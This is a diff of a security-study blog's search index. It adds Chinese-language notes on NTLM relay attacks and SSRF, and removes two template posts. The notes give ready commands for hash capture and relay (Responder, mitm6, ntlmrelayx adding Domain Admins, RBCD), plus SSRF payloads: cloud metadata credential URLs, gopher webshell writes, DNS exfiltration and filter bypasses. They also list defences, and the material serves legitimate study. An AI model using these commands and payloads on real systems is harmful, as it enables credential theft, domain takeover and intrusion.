+&lt;!-- 原来 --&gt;&lt;Relationship Id=&quot;rId1&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&quot; Target=&quot;media/image1.png&quot;/&gt;&lt;!-- 修改后 --&gt;&lt;Relationship Id=&quot;rId1&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&quot; Target=&quot;\\10.211.55.2\test\image1.png&quot; TargetMode=&quot;External&quot;/&gt;
+
+
+⚠️ 现状：新版 Office 默认会提示”是否允许链接到外部图片”，需要用户确认。但很多用户会直接点允许。
+
+PDF原理PDF 文件可以添加请求远程 SMB 服务器文件的功能。用户用 PDF 阅读器打开恶意 PDF 时，PDF 会向远程 SMB 服务器发起请求，触发 NTLM 认证。
+工具：WorsePDF.pypython2 WorsePDF.py test.pdf 10.211.55.2
+
+生成 test.pdf.malicious.pdf 文件。
+
+⚠️ 重要注意：经测试发现，**只有使用 **Adobe PDF 阅读器才能收到目标主机的 Net-NTLM Hash，Chrome、Edge 和 WPS 的 PDF 阅读器不能收到。
+
+🚩WPAD原理WPAD（Web Proxy Auto-Discovery Protocol，Web 代理自动发现协议）用来查找 PAC（Proxy Auto-Config）文件。浏览器默认勾选”自动检测设置”，会自动查询 WPAD 主机的 PAC 文件。
+方式一：配合 LLMNR&#x2F;NBNS 投毒命令（参数）
+responder -I eth0 -rPvw
+
+流程
+
+用户访问网页，浏览器自动查询 WPAD/wpad.dat
+DNS 解析失败，发起 NBNS&#x2F;LLMNR 广播
+Responder 抢答应答，告诉客户端 WPAD 的 IP 是攻击者
+客户端请求 wpad.dat，Responder 返回伪造的 PAC 文件，代理指向攻击者
+客户端通过攻击者代理访问网页，攻击者可以劫持 HTTP 流量，插入任意标签获取 Net-NTLM Hash 或 cookie
+
+
+⚠️ 现状：微软 2016 年发布了 MS16-077 补丁，修复了两个问题：
+
+系统无法再通过广播协议解析 WPAD，只能通过 DHCP 或 DNS
+请求 PAC 文件时不会自动发送凭据响应 NTLM 质询
+
+打了补丁的机器无法通过 LLMNR&#x2F;NBNS 欺骗进行 WPAD 攻击。
+
+方式二：配合 DNS IPv6（mitm6）如果目标安装了 MS16-077 补丁，无法通过 LLMNR&#x2F;NBNS 欺骗指定 WPAD，但可以通过 IPv6 DNS 欺骗。
+原理
+Windows Vista 之后默认启用 IPv6，且优先级高于 IPv4。攻击者通过 mitm6 应答 DHCPv6 请求，把目标的 IPv6 DNS 服务器设为攻击者，由于 IPv6 DNS 优先级高于 IPv4，就可以劫持 WPAD 解析。
+命令（mitm6 kali以下载）
+# 终端1：启动 mitm6sudo mitm6 -i eth0 -d 域名# 终端2：启动 responderresponder -I eth0 -rPvw
+
+流程
+
+目标机器重启或重新配置网络时，发起 DHCPv6 请求
+mitm6 应答，把目标的 IPv6 DNS 服务器设为攻击者
+目标查询 WPAD 时，走 IPv6 DNS，被攻击者劫持
+后续流程同上，获取 Net-NTLM Hash
+
+
+🚩重放Net-NTLM Hash一、中继到 SMB 协议直接中继到 SMB 服务，是最简单直接的方法，可以控制服务器执行任意命令。
+（1）工作组环境工作组中机器之间没有信任关系，除非两台机器账户密码相同，否则中继不成功。但可以中继到机器自身。
+1）MS08-068 Relay To Self收到用户的 SMB 请求后，直接把请求中继回本身（Reflect），从而控制机器。
+漏洞编号：MS08-068
+微软修复：KB957097 补丁，通过修改 SMB 身份验证答复的验证方式防止凭据重播：
+
+Type 1 阶段：主机 A 访问主机 B 时，pszTargetName 设为 CIFS/B
+Type 2 阶段：主机 A 收到 Challenge 后，在 lsass 进程缓存 (Challenge, CIFS/B)
+Type 3 阶段：主机 B 收到认证消息后，查询 lsass 缓存，如果存在缓存则认证失败
+
+
+简单说：微软通过缓存机制防止了”中继到自身”。
+
+2）CVE-2019-1384 Ghost Potato ⭐绕过了 KB957097 补丁中限制不能中继回本机的机制。
+原理：缓存有时效性（300秒），POC 休眠 315 秒后再发送 Type 3 认证消息，缓存已被清除，从而绕过限制。
+命令：
+python ntlmrelayx.py -t smb://10.211.55.7 -smb2support --gpotato-startup test.txt
+
+效果：在目标机器启动目录上传指定文件（test.txt），用户下次登录时执行。
+
+⚠️ 注意：Ghost Potato 基于 Impacket 修改，目前只支持收到 HTTP 协议请求的情况。
+
+（2）域环境域环境中，普通域用户默认可以登录除域控外的其他所有机器，因此可以将域用户的 Net-NTLM Hash 中继到域内其他机器。
+1）impacket - smbrelayx.pypython3 smbrelayx.py -h 10.211.55.16 -c whoami
+
+
+-h：目标主机 IP
+-c：中继成功后执行的命令
+
+2）impacket - ntlmrelayx.py ⭐ 最常用python3 ntlmrelayx.py -t smb://10.211.55.16 -c whoami -smb2support
+
+
+-t：中继目标（格式 smb://IP）
+-c：执行命令
+-smb2support：支持 SMB2（必须加，否则很多机器连不上）
+
+3）Responder - MultiRelay.pypython3 MultiRelay.py -t 10.211.55.16 -u ALL
+
+
+-t：中继目标
+-u ALL：中继所有用户
+
+功能：
+
+获得稳定的交互式 shell
+抓取内存密码（mimikatz）
+执行系统命令
+
+
+注意：使用MultiRelay时，需要在Responder.conf中关闭 SMB 和 HTTP 服务器，避免端口冲突。
+
+
+二、中继到 HTTP很多 HTTP 服务也支持 NTLM 认证，HTTP 默认策略是不签名的，因此可以直接中继。
+1）Exchange 认证（EWS 接口）Exchange 支持 NTLM SSP，可以将 SMB 流量中继到 Exchange 的 EWS 接口，进行收发邮件等操作。
+工具：ntlmRelayToEWS.pypython2 ntlmRelayToEWS.py -t https://10.211.55.5/EWS/exchange.asmx -r getFolder -f inbox -v
+
+
+-t：EWS 接口地址
+-r getFolder：获取文件夹
+-f inbox：收件箱
+-v：详细输出
+
+效果：中继成功后自动导出邮件，保存在 output/inbox 目录。
+2）ADCS 注册接口ADCS（证书服务）的 HTTP 接口默认使用 NTLM 认证，可以将流量中继到 ADCS 的证书注册接口，申请证书。
+
+三、中继到 LDAP 协议 ⭐ 重点域内默认使用 LDAP，LDAP 也支持 NTLM 认证，这是域内 NTLM Relay 最常用的攻击方式。
+LDAP 签名策略：默认是”协商签名”，不是强制签名，是否签名由客户端决定，服务端与客户端协商。
+ 基础命令 :
+python3 ntlmrelayx.py -t ldap://域控IP -smb2support
+
+中继到 LDAP 能做什么
+添加域用户
+
+python3 ntlmrelayx.py -t ldap://域控IP --add-user --add-to-group &quot;Domain Admins&quot; -smb2support
+
+
+仅添加用户（不加组）
+
+python3 ntlmrelayx.py -t ldap://域控IP --add-user -smb2support
+
+
+添加到指定组
+
+python3 ntlmrelayx.py -t ldap://域控IP --add-to-group &quot;Enterprise Admins&quot; -smb2support
+
+
+Dump LDAP 信息  ( 导出域内所有用户、组、计算机的信息)
+
+python3 ntlmrelayx.py -t ldap://域控IP --dump-ad -smb2support
+
+
+修改用户密码
+
+python3 ntlmrelayx.py -t ldap://域控IP --escalate-user 用户名 -smb2support
+
+
+配置 RBCD（基于资源的约束委派）⭐
+
+# 第1步：中继到 LDAP，创建机器账户并配置 RBCDpython3 ntlmrelayx.py -t ldap://域控IP --add-computer --delegate-access -smb2support# 第2步：用创建的机器账户进行 RBCD 攻击python3 getST.py -spn cifs/目标机器.域名 -impersonate administrator -hashes :机器账户NTLM哈希 域名/机器账户$ -dc-ip 域控IP# 第3步：拿到 ST 后，用 Ptt 访问目标export KRB5CCNAME=administrator.ccachepython3 psexec.py -k -no-pass 目标机器.域名
+
+HTTP → LDAP vs SMB → LDAP
+
+
+中继来源
+是否需要签名
+说明
+
+
+
+HTTP → LDAP
+❌ 不要求签名
+可以直接中继，如 CVE-2018-8581
+
+
+SMB → LDAP
+✅ 要求签名
+不能直接中继，但 CVE-2019-1040 绕过了 NTLM 消息完整性校验
+
+
+域内最新的中继手法：想办法将 HTTP 类型的流量中继到 LDAP
+🚩HTTP → LDAP 中继（CVE-2018-8581）如果有 HTTP 类型的认证流量（比如 Exchange），可以直接中继到 LDAP，不需要签名：
+# 中继 HTTP 到 LDAPpython3 ntlmrelayx.py -t ldap://域控IP --add-user --add-to-group &quot;Domain Admins&quot;
+
+HTTP流量默认不签名，所以中继到LDAP成功率更高。
+SMB → LDAP 中继（CVE-2019-1040）SMB 流量默认要求签名，不能直接中继到LDAP。但CVE-2019-1040可以绕过 NTLM 消息完整性校验：
+# 利用 CVE-2019-1040 中继 SMB 到 LDAPpython3 ntlmrelayx.py -t ldap://域控IP --remove-mic -smb2support
+
+--remove-mic 参数：移除 NTLM 消息中的 MIC（消息完整性码），绕过签名校验。
+
+NTLM Relay 攻击防御核心防御：LDAP 签名域内 NTLM Relay 最常见的是中继到 LDAP 执行高危险操作，因此需要对 LDAP 进行安全加固。
+微软计划：2019 年 9 月发布通告，2020 年 1 月发布安全更新，强制开启所有域控上的 LDAP 通道绑定与 LDAP 签名功能。
+如果域控上的 LDAP 强制开启了签名，攻击者将无法将其他流量中继到 LDAP 进行高危险操作。
+其他防御方法
+启用 SMB 签名：所有服务器强制启用 SMB 签名
+禁用 LLMNR 和 NBT-NS：减少被投毒的机会
+启用 EPA（扩展保护）：对 HTTP 服务启用扩展保护
+限制账户权限：普通用户不要有过高权限
+及时打补丁：MS08-068、KB957097、CVE-2019-1384、CVE-2019-1040 等
+
+
+常用中继工具命令汇总# 1. ntlmrelayx（最常用，impacket）python3 ntlmrelayx.py -t smb://目标IP -c whoami -smb2supportpython3 ntlmrelayx.py -t ldap://域控IP -smb2supportpython3 ntlmrelayx.py -tf targets.txt -smb2support  # 批量中继# 2. smbrelayx（impacket）python3 smbrelayx.py -h 目标IP -c whoami# 3. MultiRelay（Responder 自带）python3 MultiRelay.py -t 目标IP -u ALL# 4. ntlmRelayToEWS（中继到 Exchange）python2 ntlmRelayToEWS.py -t https://ExchangeIP/EWS/exchange.asmx -r getFolder -f inbox -v# 5. Ghost Potato（中继到自身）python ntlmrelayx.py -t smb://目标IP -smb2support --gpotato-startup test.txt
+
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>域渗透</tag>
+        <tag>NTLM Relay</tag>
+        <tag>内网渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -2931,32 +3270,617 @@ POC（报错注入）:
       </tags>
   </entry>
   <entry>
-    <title>Web 安全笔记写作模板</title>
-    <url>/2026/08/14/web-security-notes-template/</url>
-    <content><![CDATA[
-这是一篇示例文章，展示 Web 安全笔记的推荐写法。
+    <title>欢迎来到我的安全博客</title>
+    <url>/2026/08/14/welcome-to-my-blog/</url>
+    <content><![CDATA[博客定位你好，欢迎来到我的安全博客 👋
+这里是我的 网络安全学习笔记，主要用于记录我在 Web 安全、渗透测试、CTF 比赛和靶场练习中的所学所思。
+内容分类
 
-漏洞概述一句话说明这个漏洞是什么。
-漏洞原理详细讲解漏洞成因，配图或代码。
-&lt;?php$id = $_GET[&#x27;id&#x27;];$sql = &quot;SELECT * FROM users WHERE id = $id&quot;;?&gt;
 
-漏洞复现环境准备利用步骤payload 示例
+分类
+内容
 
-防御方案
-方案一
-方案二
-方案三
 
-参考资料
-OWASP
+
+Web安全
+各类 Web 漏洞的原理、利用与防御
+
+
+渗透测试
+实战渗透流程、工具使用、思路总结
+
+
+CTF
+比赛 Writeup、解题复盘
+
+
+靶场
+DVWA &#x2F; sqli-labs &#x2F; upload-labs &#x2F; Vulnhub &#x2F; HTB 等通关笔记
+
+
+写作规范
+所有文章均遵循「原理 → 复现 → 防御」的结构
+靶场与比赛文章请务必标注目标来源与授权范围
+文章仅供学习交流，请勿用于非法用途
+
+联系我
+GitHub：Echoin-613
+
+
+道阻且长，行则将至。一起加油 💪
+
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>博客</tag>
+        <tag>说明</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSRF（服务端请求伪造）</title>
+    <url>/2026/08/14/ssrf/</url>
+    <content><![CDATA[SSRF（Server-Side Request Forgery，服务器端请求伪造） 是一种由攻击者构造请求并由服务端发起的安全漏洞。由于请求源自服务器本身，因此可访问外网无法直接触达的 内网系统、本地服务 等敏感资源。
+形成原因 多数源于服务端提供了从其他服务器获取数据的功能（如加载图片、抓取网页、下载文件等），但 未对目标地址、协议、端口进行严格限制。攻击者可控制URL参数，让服务器充当“代理”访问任意资源。
+1. 一句话本质服务器替攻击者发起请求，攻击者借服务端的网络身份访问内网&#x2F;本地服务，绕过网络边界限制。
+为什么成立？
+服务端有访问内网的权限（防火墙只防外部，不防内部）
+请求的 URL 由用户控制
+服务端没有严格校验 URL 的目标地址
+攻击者可以让服务端请求内网 IP、本地端口、云元数据等
+
+核心条件
+✅ 服务端会发起 HTTP&#x2F;网络请求
+✅ 请求的 URL 或参数用户可控
+✅ 没有严格的协议&#x2F;域名&#x2F;IP 校验
+
+
+2. 代码特征（看到 &#x3D; 有洞）各语言危险函数
+
+
+语言
+危险函数&#x2F;库
+
+
+
+PHP
+curl_exec() &#x2F; curl_multi_exec()
+
+
+
+file_get_contents($url)
+
+
+
+fsockopen() &#x2F; fopen()
+
+
+
+simplexml_load_file()
+
+
+Python
+requests.get(url) &#x2F; requests.post(url)
+
+
+
+urllib.request.urlopen(url)
+
+
+
+urllib2.urlopen(url)
+
+
+
+httpx.get(url) &#x2F; aiohttp.get(url)
+
+
+Java
+HttpClient.execute()
+
+
+
+OkHttpClient.newCall()
+
+
+
+URL.openConnection() &#x2F; URLConnection
+
+
+
+RestTemplate.getForObject()
+
+
+Node.js
+fetch(url)
+
+
+
+axios.get(url) &#x2F; axios.post(url)
+
+
+
+http.get(url) &#x2F; https.get(url)
+
+
+
+request(url)
+
+
+Go
+http.Get(url) &#x2F; http.Post(url)
+
+
+常见触发场景
+
+
+场景
+说明
+
+
+
+图片&#x2F;文件 URL 加载
+用户传 URL，服务端下载图片&#x2F;文件
+
+
+URL 分享预览
+输入网址，服务端抓取页面生成预览
+
+
+网页抓取器
+爬虫、网页截图、HTML 转 PDF
+
+
+代理接口
+服务端作为代理，转发请求到其他服务
+
+
+回调&#x2F;Webhook
+用户设置回调地址，服务端请求
+
+
+RSS 订阅
+订阅 URL，服务端拉取 RSS 内容
+
+
+第三方 API 调用
+用户指定 API 地址，服务端调用
+
+
+3. 审计路径（source → sink）用户输入 URL/参数    ↓拼接到请求地址    ↓服务端发起请求（sink）    ↓返回结果给用户（可选）
+
+详细审计步骤第一步：找 sink（请求函数）搜 curl_exec / file_get_contents / requests.get / http.get 等
+
+重点看：
+
+URL 参数是怎么来的？
+是直接用用户输入，还是拼接的？
+有没有经过校验？
+
+第二步：找 source（用户输入）看 URL 参数的来源：$_GET / $_POST / $_REQUEST / 数据库 / 配置文件
+
+判断可控性：
+
+完全用户可控 → 高风险
+部分可控（只能改路径）→ 中风险
+完全不可控 → 低风险
+
+第三步：检查防护（三个重点）
+
+
+检查点
+怎么查
+常见问题
+
+
+
+协议限制
+有没有限制只能 http&#x2F;https？
+没限制 → 可以用 file&#x2F;gopher&#x2F;dict 等
+
+
+域名校验
+有没有校验域名？
+校验方式不对 → 可绕过
+
+
+IP 过滤
+有没有过滤内网 IP？
+过滤不完整 → 可绕过
+
+
+第四步：判断危害
+
+
+情况
+危害等级
+
+
+
+无任何限制 + 回显结果
+⭐⭐⭐⭐⭐
+
+
+无任何限制 + 不回显（盲 SSRF）
+⭐⭐⭐⭐
+
+
+有协议限制但可绕过 + 回显
+⭐⭐⭐⭐
+
+
+有域名白名单但可绕过
+⭐⭐⭐
+
+
+严格防护 + 无法绕过
+⭐
+
+
+审计重点
+协议限制：有没有 CURLOPT_PROTOCOLS &#x2F; scheme 校验？
+重定向：有没有跟随 302 跳转？跟随的话会不会跳到内网？
+DNS 解析：校验域名的时候解析一次，请求的时候又解析一次？（DNS rebinding）
+IP 校验：是校验域名解析后的 IP，还是只校验域名字符串？
+错误信息：会不会把请求结果&#x2F;错误返回给用户？（有回显更好利用）
+
+
+4. 白盒验证验证步骤第一步：确认漏洞存在
+找到 sink 函数
+确认 URL 参数用户可控
+确认没有严格的防护
+
+第二步：构造 PoC最简单的 PoC：
+http://127.0.0.1/http://localhost/
+
+读文件 PoC：
+file:///etc/passwdfile:///c:/windows/system32/drivers/etc/hosts
+
+内网探测 PoC：
+http://10.0.0.1/http://172.16.0.1/http://192.168.1.1/
+
+第三步：验证防护是否有效
+协议限制：试试 file:// &#x2F; gopher:// &#x2F; dict://
+域名白名单：试试各种绕过方式
+IP 过滤：试试各种 IP 编码方式
+
+5. 黑盒验证方法 1：HTTP 回显验证
+如果目标会把请求结果返回给用户：
+
+让它请求 http://example.com，看返回的是不是 example.com 的内容
+让它请求 http://127.0.0.1:80，看返回的是不是本地服务
+
+方法 2：DNSLog 验证（盲 SSRF 也能用）
+
+去 DNSLog 平台申请一个域名：xxx.dnslog.cn
+让目标请求 http://xxx.dnslog.cn/
+看 DNSLog 有没有收到请求
+有收到 → 存在 SSRF
+
+优点： 不需要回显，盲 SSRF 也能测缺点： 只能证明存在，不能直接利用
+方法 3：时间差验证（纯盲）
+
+请求一个不存在的内网 IP，看响应时间
+请求一个存在的内网 IP，看响应时间
+如果有明显差异 → 可能存在 SSRF
+
+黑盒测试步骤1. 找所有可能的 SSRF 参数（url / src / image / callback / webhook / proxy ...）2. 每个参数都试 DNSLog 地址3. 收到 DNS 请求 → 确认存在4. 再试各种协议和内网地址
+
+
+6. 利用与打法！利用方式全景图拿到 SSRF│├─ ① 先测协议能力│   ├─ file:// 能读吗？→ 直接读 /flag、/etc/passwd、/proc/self/environ│   └─ 只能 http/gopher/dict → 继续│├─ ② 看技术栈│   ├─ PHP 站 → 重点查 9000│   ├─ 有数据库 → 查 3306│   └─ 有缓存 → 查 6379│├─ ③ dict:// 扫端口│   ├─ 9000 开 → 【打 FastCGI】← 首选│   ├─ 6379 开 → 【打 Redis 未授权】│   ├─ 3306 开 → 试无密码; 不行就排除│   └─ 全关 → file:// 读文件 / 打云元数据│└─ ④ 看题目提示（排除法）    ├─ &quot;mysql 有密码&quot; → 排除 3306，打 9000/6379    ├─ &quot;需要拿 shell&quot; → 优先 RCE（FastCGI/Redis）    └─ 无提示 → 按优先级表直接打 FastCGI
+
+
+
+
+利用方式
+协议
+效果
+
+
+
+读本地文件
+file://
+读取服务器本地文件（&#x2F;etc&#x2F;passwd、源码、配置文件等）
+
+
+内网探测
+http://
+扫描内网 IP 段、端口，发现内网服务
+
+
+云元数据
+http://
+读取云服务器元数据，拿 AccessKey&#x2F;SecretKey&#x2F;token
+
+
+**302 跳 Gopher  **
+http:// → gopher://
+绕过协议限制，通过 302 跳转打 Redis&#x2F;MySQL 等内网服务
+
+
+**302 跳 HTTP  **
+http:// → http://
+绕过域名白名单 &#x2F; 内网 IP 过滤，访问内网 Web 服务
+
+
+打 Redis
+gopher://
+写 webshell &#x2F; 写定时任务 &#x2F; 写 SSH 公钥 &#x2F; 主从复制 RCE
+
+
+打 MySQL
+gopher://
+写 webshell（INTO OUTFILE）&#x2F; UDF 提权 &#x2F; 读数据库
+
+
+打 FastCGI
+gopher://
+直接执行任意 PHP 代码（PHP-FPM 9000 端口）
+
+
+打 Memcached？
+gopher://
+缓存投毒 &#x2F; 命令执行 &#x2F; 数据窃取
+
+
+打 Zabbix
+gopher://
+未授权 RCE
+
+
+打内网 Web
+http://
+访问内网未授权接口 &#x2F; 打内网 Web 漏洞
+
+
+端口扫描
+dict:// &#x2F; http://
+扫描内网端口开放情况，识别服务
+
+
+DNS 外带
+http://
+把数据通过 DNS 查询带出（盲 SSRF 用）
+
+
+详细说明1. 读本地文件（最简单）Payload：
+file:///etc/passwdfile:///proc/self/environfile:///var/www/html/index.php
+
+条件： 支持 file 协议 + 有回显
+
+2. 内网探测Payload：
+http://127.0.0.1:22/     # SSHhttp://127.0.0.1:6379/   # Redishttp://127.0.0.1:3306/   # MySQLhttp://127.0.0.1:8080/   # 常见内网端口http://10.0.0.1/         # 内网网段
+
+判断端口是否开放：
+
+响应快 + 有内容 → 开放
+响应慢 + 连接超时 → 不开放
+
+
+3. 云元数据（部分）AWS：
+http://169.254.169.254/latest/meta-data/http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+阿里云：
+http://100.100.100.200/latest/meta-data/http://100.100.100.200/latest/meta-data/ram/security-credentials/
+
+腾讯云：
+http://metadata.tencentyun.com/latest/meta-data/
+
+拿到什么？
+
+AccessKey &#x2F; SecretKey → 控制整个云账号
+实例 ID &#x2F; 安全组配置
+临时 token
+
+
+4. 打 Redis（gopher 协议）能做什么？
+
+写 webshell（INTO OUTFILE）
+写定时任务（crontab）
+写 SSH 公钥
+主从复制 RCE
+
+工具： gopherus
+
+5. 打 MySQL（gopher 协议）能做什么？
+
+写 webshell（SELECT ... INTO OUTFILE）
+UDF 提权
+读数据库数据
+
+条件： 知道用户名密码（空密码 &#x2F; 弱口令）
+
+6. 打 FastCGI（gopher 协议）能做什么？
+
+直接执行任意 PHP 代码
+不需要知道密码
+危害最大
+
+条件： PHP-FPM 监听在 9000 端口，且可访问
+
+7. Payload 模板基础探测类# 本地回环http://127.0.0.1/http://localhost/http://0.0.0.0/# 读文件file:///etc/passwdfile:///c:/windows/system32/drivers/etc/hosts# 云元数据http://169.254.169.254/latest/meta-data/# 端口探测dict://127.0.0.1:6379/infodict://127.0.0.1:3306/
+
+gopher 打 MySQLgopher://127.0.0.1:3306/_[MySQL协议包]
+
+SQL 语句：
+SELECT &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27; INTO OUTFILE &#x27;/var/www/html/shell.php&#x27;
+
+生成工具： gopherus
+gopher 打 Redisgopher://127.0.0.1:6379/_[Redis协议包]
+
+常用命令：
+SET shell &quot;&lt;?php eval($_POST[1]);?&gt;&quot;CONFIG SET dir /var/www/htmlCONFIG SET dbfilename shell.phpSAVE
+
+DNS 外带http://[数据].xxx.dnslog.cn/
+
+把要带的数据放在子域名里，通过 DNS 查询带出来。
+
+8. 绕过技巧绕过 1：IP 地址编码
+
+
+编码方式
+例子
+说明
+
+
+
+十进制
+http://2130706433/
+127.0.0.1 的十进制
+
+
+八进制
+http://0177.0.0.1/
+0 开头表示八进制
+
+
+十六进制
+http://0x7f000001/
+0x 开头表示十六进制
+
+
+混合编码
+http://0x7f.0.0.1/
+各段不同进制
+
+
+IPv6
+http://[::1]/
+IPv6 的回环地址
+
+
+短地址
+http://127.1/
+省略中间的 0
+
+
+
+绕过 2：域名解析绕过
+
+
+绕过方式
+例子
+原理
+
+
+
+@ 符号
+http://white.com@evil.com/
+前面是用户名，后面才是域名
+
+
+# 符号
+http://white.com#evil.com/
+# 后面是锚点，实际请求 white.com
+
+
+? 符号
+http://evil.com?white.com
+? 后面是参数，域名还是 evil.com
+
+
+子域名
+http://evil.white.com
+白名单是 *.white.com 就绕过了
+
+
+DNS rebinding
+自定义 DNS 服务器
+第一次解析返回白名单 IP，第二次返回内网 IP
+
+
+
+绕过 3：127.0.0.1 变体http://127.0.0.1/http://127.0.0.2/http://127.1.2.3/http://127.255.255.254/http://0.0.0.0/http://localhost/http://[::1]/          # IPv6http://0x7f000001/     # 十六进制http://2130706433/     # 十进制
+
+
+💡 127.x.x.x 整个网段都是回环地址，不只是 127.0.0.1
+
+
+绕过 4：重定向绕过如果目标校验了域名，但会跟随 302 跳转：
+
+自己搭一个服务器
+服务器返回 302 跳转到 http://127.0.0.1/
+目标请求白名单域名 → 被 302 到内网 → 绕过
+
+关键： CURLOPT_FOLLOWLOCATION &#x2F; follow_redirects 是否开启
+
+绕过 5：协议绕过
+
+
+情况
+绕过方式
+
+
+
+过滤了 http://
+用 HTTP://（大小写）
+
+
+过滤了 file://
+用 File:// &#x2F; FILE://
+
+
+只允许 http&#x2F;https
+看能不能用 302 跳转到其他协议
+
+
+
+绕过 6：URL 解析差异不同语言&#x2F;库对 URL 的解析不一样：
+http://127.0.0.1\@white.com/
+
+有的库认为域名是 white.com，有的认为是 127.0.0.1
+利用这种差异，可以绕过校验但实际请求的是内网。
+
+审计速查表
+
+
+看到什么
+想到什么
+
+
+
+curl_exec($url)
+SSRF！有没有协议限制？
+
+
+file_get_contents($url)
+SSRF！支持 file 协议吗？
+
+
+用户传 URL 参数
+会不会有 SSRF？
+
+
+图片下载 &#x2F; URL 预览
+经典 SSRF 场景
+
+
+没有 CURLOPT_PROTOCOLS
+默认支持所有协议 &#x3D; 危险
+
+
+跟随 302 跳转
+可能可以跳转绕过白名单
+
+
+只校验域名字符串
+DNS rebinding 绕过
+
+
+云服务器
+试试打元数据接口
+
+
 
 ]]></content>
       <categories>
         <category>Web安全</category>
       </categories>
       <tags>
-        <tag>模板</tag>
-        <tag>Web安全</tag>
+        <tag>SSRF</tag>
+        <tag>服务端请求伪造</tag>
+        <tag>内网</tag>
       </tags>
   </entry>
   <entry>
@@ -3207,107 +4131,6 @@ confirm(1)、prompt(1)、print()
       <tags>
         <tag>XSS</tag>
         <tag>跨站脚本</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>欢迎来到我的安全博客</title>
-    <url>/2026/08/14/welcome-to-my-blog/</url>
-    <content><![CDATA[博客定位你好，欢迎来到我的安全博客 👋
-这里是我的 网络安全学习笔记，主要用于记录我在 Web 安全、渗透测试、CTF 比赛和靶场练习中的所学所思。
-内容分类
-
-
-分类
-内容
-
-
-
-Web安全
-各类 Web 漏洞的原理、利用与防御
-
-
-渗透测试
-实战渗透流程、工具使用、思路总结
-
-
-CTF
-比赛 Writeup、解题复盘
-
-
-靶场
-DVWA &#x2F; sqli-labs &#x2F; upload-labs &#x2F; Vulnhub &#x2F; HTB 等通关笔记
-
-
-写作规范
-所有文章均遵循「原理 → 复现 → 防御」的结构
-靶场与比赛文章请务必标注目标来源与授权范围
-文章仅供学习交流，请勿用于非法用途
-
-联系我
-GitHub：Echoin-613
-
-
-道阻且长，行则将至。一起加油 💪
-
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>博客</tag>
-        <tag>说明</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>靶场笔记写作模板</title>
-    <url>/2026/08/14/lab-notes-template/</url>
-    <content><![CDATA[
-这是一篇示例文章，展示靶场笔记的推荐写法。
-
-靶场信息
-
-
-项目
-内容
-
-
-
-靶场名称
-DVWA &#x2F; sqli-labs &#x2F; upload-labs &#x2F; Vulnhub &#x2F; HTB
-
-
-目标地址
-http://xxx
-
-
-难度
-低 &#x2F; 中 &#x2F; 高
-
-
-授权范围
-本地练习 &#x2F; 官方授权
-
-
-环境搭建docker run -d -p 80:80 vulnerables/web-dvwa
-
-漏洞点分析描述漏洞成因与触发条件。
-利用过程步骤一：xxxsqlmap -u &quot;http://target/?id=1&quot; --dbs
-
-步骤二：xxx插入截图（图片放在与文章同名的资源文件夹中）：
-&#123;% asset_img 1.png 截图描述 %&#125;
-
-防御与修复
-过滤输入
-使用参数化查询
-最小权限原则
-
-]]></content>
-      <categories>
-        <category>靶场</category>
-      </categories>
-      <tags>
-        <tag>模板</tag>
-        <tag>靶场</tag>
       </tags>
   </entry>
 </search>
